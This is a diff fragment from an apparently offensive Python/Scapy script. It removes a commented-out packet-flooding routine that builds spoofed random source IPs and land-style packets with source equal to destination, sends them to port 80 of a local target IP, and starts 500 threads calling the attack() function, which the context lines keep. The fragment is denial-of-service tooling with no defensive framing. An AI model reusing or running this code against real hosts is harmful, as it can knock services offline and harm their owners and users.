@@ -19,35 +19,6 @@ def attack():
         except:
             print("Packet Failed")
             exit()
-        # a = str(random.randint(1,254))
-        # b = str(random.randint(1,254))
-        # c = str(random.randint(1,254))
-        # d = str(random.randint(1,254))
-        # dot = "."
-        # global source_port, target_IP, i
-        # Source_ip = a + dot + b + dot + c + dot + d
-        # IP1 = IP(src = target_IP, dst = target_IP)
-        # TCP1 = TCP(sport = source_port, dport = 80)
-        # pkt = IP1 / TCP1
-        # packet = IP(src=Source_ip, dst=target_IP)/TCP(sport = source_port,dport=80)/\
-        #     b"GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n"
-        # try:
-        #     send(pkt,inter = .001)
-        #     print ("packet sent ", i)
-        #     i = i + 1
-        # except: 
-        #     print("Packet not sent")
-        
-# target_IP = "192.168.1.37"
-# source_port = 5000
-# i = 1
-# # attack()
-# try:
-#   for _ in range(500):
-#     thread = threading.Thread(target=attack)
-#     thread.start()
-# except (KeyboardInterrupt, SystemExit):
-#   print ('\n! Received keyboard interrupt, quitting threads.\n')
 
 
 from scapy.all import *
